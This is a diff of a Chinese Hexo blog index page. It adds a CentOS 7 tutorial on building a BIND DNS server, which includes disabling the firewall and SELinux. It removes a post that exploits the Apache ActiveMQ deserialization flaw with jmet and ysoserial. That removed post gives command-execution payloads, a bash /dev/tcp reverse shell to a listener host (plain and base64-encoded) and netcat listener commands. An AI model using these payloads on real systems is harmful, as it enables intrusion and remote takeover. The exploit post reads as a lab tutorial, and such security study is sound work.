@@ -229,6 +229,142 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/29/dajianfuwu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/29/dajianfuwu/" itemprop="url">centos7 搭建dns服务器</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-29T09:16:18+08:00">
+                2019-07-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h1 id="centos7-搭建dns服务器"><a href="#centos7-搭建dns服务器" class="headerlink" title="centos7 搭建dns服务器"></a>centos7 搭建dns服务器</h1><ol>
+<li>DNS服务简介<br>DNS（Domain Name System）域名系统。<br>目前提供网络服务的应用使用唯一的32位的IP地址来标识，但是由于数字比较复杂、难以记忆，因此产生了域名系统（DNS），通过域名系统，可以使用易于理解和形象的字符串名称来标识网络应用（如<a href="http://www.baidu.com、www.taobao.com）。访问互联网应用可以使用域名，也可以通过IP地址直接访问该应用，在使用域名访问网络应用时，DNS负责将域名解析为IP地址。" target="_blank" rel="noopener">www.baidu.com、www.taobao.com）。访问互联网应用可以使用域名，也可以通过IP地址直接访问该应用，在使用域名访问网络应用时，DNS负责将域名解析为IP地址。</a></li>
+<li>主机名和域名的区别？<br>主机名是内网的名字；域名是外网的名字。<br>主机名和域名其实是两个完全可以不同的名字，但是有很多软件（如邮件系统postfix)会默认认为它们一致。<br>全世界共有有13台DNS根域服务器。</li>
+<li>DNS服务器特点<br>分布式的数据库<br>解决了数据不一致，避免了名字冲突<br>有缓存机制，提高了性能和可靠性 。</li>
+<li>域名解析过程<br>为了将一个名字解析成一个IP地址，用户应用程序调用一个称为解析器的库程序，将名字作为参数传递给它，形成DNS用户；然后DNS用户发送查询请求给本地域名服务器，服务器首先在其管辖区域内查找名字，名字找到后，把对应的IP地址返回给DNS客户。完整的名字解析过程如下图所示：<br><a href="https://imgchr.com/i/mE3e91" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE3e91.png" alt="mE3e91.png"></a><br>二、系统环境<br>系统平台： CentOS 7.3<br>DNS Server： 192.168.110.36<br>关闭防火墙<h1 id="systemctl-stop-firewalld-–临时关闭防火墙"><a href="#systemctl-stop-firewalld-–临时关闭防火墙" class="headerlink" title="systemctl  stop  firewalld               –临时关闭防火墙"></a>systemctl  stop  firewalld               –临时关闭防火墙</h1><h1 id="systemctl-disable-firewalld-–永久关闭防火墙"><a href="#systemctl-disable-firewalld-–永久关闭防火墙" class="headerlink" title="systemctl  disable  firewalld          –永久关闭防火墙"></a>systemctl  disable  firewalld          –永久关闭防火墙</h1>关闭selinux：<br>临时关闭：<br>#setenforce 0<br>永久关闭：<br>#vim /etc/selinux/config<br>SELINUX=disabled<br>安装bind<br>yum -y install bind*<br><a href="https://imgchr.com/i/mE38Nd" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE38Nd.png" alt="mE38Nd.png"></a><br>安装好后查看软件包<br>rpm  -qa  |  grep  ^bind<br><a href="https://imgchr.com/i/mE35E4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE35E4.png" alt="mE35E4.png"></a></li>
+<li>启动DNS服务<h1 id="systemctl-start-named-service-–启动DNS服务"><a href="#systemctl-start-named-service-–启动DNS服务" class="headerlink" title="systemctl start named.service         –启动DNS服务"></a>systemctl start named.service         –启动DNS服务</h1><h1 id="systemctl-enable-named-service-–设置为开机启动"><a href="#systemctl-enable-named-service-–设置为开机启动" class="headerlink" title="systemctl enable named.service     –设置为开机启动"></a>systemctl enable named.service     –设置为开机启动</h1><h1 id="netstat-anlp-grep-named-–查看监听端口为53"><a href="#netstat-anlp-grep-named-–查看监听端口为53" class="headerlink" title="netstat -anlp | grep named             –查看监听端口为53"></a>netstat -anlp | grep named             –查看监听端口为53</h1><a href="https://imgchr.com/i/mE89PA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE89PA.png" alt="mE89PA.png"></a><br>named作为标准的系统服务脚本，通过“systemctl start/restart/stop named.service”的形式可以实现对服务器程序的控制<br>named默认监听TCP、UDP协议的53端口，以及TCP的953端口：<br>其中UDP 53端口一般对所有客户机开放，以提供解析服务；<br>TCP 53端口一般只对特定从域名服务器开放，提高解析记录传输通道；TCP 953端口默认只对本机（127.0.0.1）开放，用于为rndc远程管理工具提供控制通道<br>配置文件的目录：<br>没有安装bind-chroot软件包<br>配置文件为/etc/named.conf<br>数据文件在/var/named目录下</li>
+</ol>
+<p>安装了bind-chroot软件包<br>配置文件为/var/named/chroot/etc/named.conf    –默认没有<br>数据文件在/var/named/chroot/var/named目录<br> 域名服务器的配置<br>配置步骤：<br>编辑/etc/named.rfc1912.zones     –记录你的域和域对应的数据文件在哪<br>编辑/var/named/data/*.zone        –就是数据文件，记录域名和IP的对应<br>正向解析（将域名解析成IP）<br>（一）修改DNS服务的配置文件<br>vim  /etc/named.conf                                         –主配置文件 </p>
+<p>#vim /etc/named/conf<br>options {<br>listen-on port 53 { 192.168.110.36; }; # 将127.0.0.1改为本机IP：<br>192.168.110.36<br>listen-on-v6 port 53 { ::1; };<br>directory “/var/named”;<br>dump-file “/var/named/data/cache_dump.db”;<br>statistics-file “/var/named/data/named_stats.txt”;<br>memstatistics-file “/var/named/data/named_mem_stats.txt”;<br>allow-query { any; }; # 将localhost改为any,表示所有人都能对我的<br>DNS服务进行查询<br>添加域的信息写在子配置文件<br> vim  /etc/named.rfc1912.zones          –文件最后添加正向解析数据文件的信息</p>
+<p>#vim /etc/named.rfc1912.zones –文件最后添加正 解析数据文件 信<br>zone “test.com” IN {<br>type master;<br>file “data/test.com.zone”;<br>};<br><a href="https://imgchr.com/i/mE81MV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE81MV.png" alt="mE81MV.png"></a><br>编辑正向解析文件<br>vim  /var/named/data/test.com.zone   –编辑正向解析文件（将域名解析成IP）<br>$TTL 1D<br>@       IN SOA  dns.test.com. dns.<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a>. (<br>                                        20171224      ; serial<br>                                        1D      ; refresh<br>                                        1H      ; retry<br>                                        1W      ; expire<br>                                        3H )    ; minimum<br>@                       IN      NS      dns.test.com.<br>dns.test.com.           IN      A       192.168.110.36<br>@                       IN      MX 10   mail.<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a>.<br>mail.<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a>.      IN      A       192.168.8.4<br><a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a>.           IN      A       192.168.110.36<br>ftp.test.com.           IN      A       192.168.8.3<br><a href="https://imgchr.com/i/mE8DsK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE8DsK.png" alt="mE8DsK.png"></a><br>systemctl  restart  named.service            –配置好后，重新DNS服务<br>客户端测试<br>注意：客户端必须要跟服务器端通信（能ping通）及关闭selinux</p>
+<p>#vim /etc/resolv.conf –修改客户的DNS服务器<br>nameserver 192.168.110.36 –IP为服务器的IP<br>以下三个解析命令，仍选其一就可以了。</p>
+<p>#dig <a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></p>
+<p>#nslooup <a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a></p>
+<p>#host <a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a><br><a href="https://imgchr.com/i/mE8LJs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE8LJs.png" alt="mE8LJs.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mE8xyV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mE8xyV.png" alt="mE8xyV.png"></a><br>正向解析成功！<br>反向解析(将IP解析成域名)<br>（一）修改DNS服务的配置文件<br>vim  /etc/named.rfc1912.zones       –文件最后添加反向解析数据文件的信息<br><a href="https://imgchr.com/i/mEGQFH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEGQFH.png" alt="mEGQFH.png"></a><br>二）编辑反向解析文件<br> vim  /var/named/data/192.168.110.zone</p>
+<p>#vim /var/named/data/192.168.110.zone<br>$TTL 1D<br>@ IN SOA dns.test.com. dns.<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a>. (<br>                                 20190629 ; serial<br>                                 1D ; refresh<br>                                 1H ; retry<br>                                 1W ; expire<br>                                 3H ) ; minimum<br>@ IN NS dns.test.com.<br>36 IN PTR dns.test.com.<br>@ IN MX 10 mail.<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a>.<br>4 IN PTR mail.<a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a>.<br>36 IN PTR <a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a>.<br>3 IN PTR ftp.test.com.<br><a href="https://imgchr.com/i/mEGBfs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEGBfs.png" alt="mEGBfs.png"></a><br>systemctl  restart  named.service       –配置好后，重启DNS服务<br>客户端测试</p>
+<h1 id="nslookup-192-168-110-43"><a href="#nslookup-192-168-110-43" class="headerlink" title="nslookup 192.168.110.43"></a>nslookup 192.168.110.43</h1><p><a href="https://imgchr.com/i/mEGR7F" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mEGR7F.png" alt="mEGR7F.png"></a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/ld (14)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1323,127 +1459,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/25/ld/" itemprop="url">反序列化漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T15:05:18+08:00">
-                2019-07-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。<br>1.漏洞利用过程如下：<br>a.构造（可以使用ysoserial）可执行命令的序列化对象<br>b.作为一个消息，发送给目标61616端口<br>c.访问的Web管理页面，读取消息，触发漏洞<br>&emsp;<br>1.使用jmet进行漏洞利用:<br>首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。<br>wget <a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a><br>mkdir external<br>&emsp;<br>2.执行命令<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/zqd” -Yp ROME   192.168.199.120  61616<br><a href="https://imgchr.com/i/mkbKun" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkbKun.png" alt="mkbKun.png"></a><br>&emsp;<br>3现在我们可以通过<a href="http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event到这个队列中所有消息：" target="_blank" rel="noopener">http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event到这个队列中所有消息：</a><br><a href="https://imgchr.com/i/mkbcgH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkbcgH.png" alt="mkbcgH.png"></a><br>&emsp;<br>5.点击查看这条消息即可触发命令执行<br><a href="https://imgchr.com/i/mkb78g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkb78g.png" alt="mkb78g.png"></a><br>&emsp;<br>6反弹shell:<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -i &gt;&amp; /dev/tcp/192.168.199.207/8899 0&gt;&amp;1” -Yp ROME 192.168.199.120  61616<br>这里bash -i &gt;&amp; /dev/tcp/192.168.199.207/12340&gt;&amp;1”需要解码<br><a href="https://imgchr.com/i/mkqnPO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqnPO.png" alt="mkqnPO.png"></a><br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OS4yMDcvODg5OSAwPiYx}|{base64,-d}|{bash,-i}” -Yp ROME 192.168.199.120 61616<br><a href="https://imgchr.com/i/mkqgiT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqgiT.png" alt="mkqgiT.png"></a><br>&emsp;<br>7 远程主机监听8899端口：<br>nc  -lvvp  8899<br>nc -l -p 8899<br><a href="https://imgchr.com/i/mkqqJO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqqJO.png" alt="mkqqJO.png"></a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1494,7 +1509,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1507,7 +1522,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-count">16</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
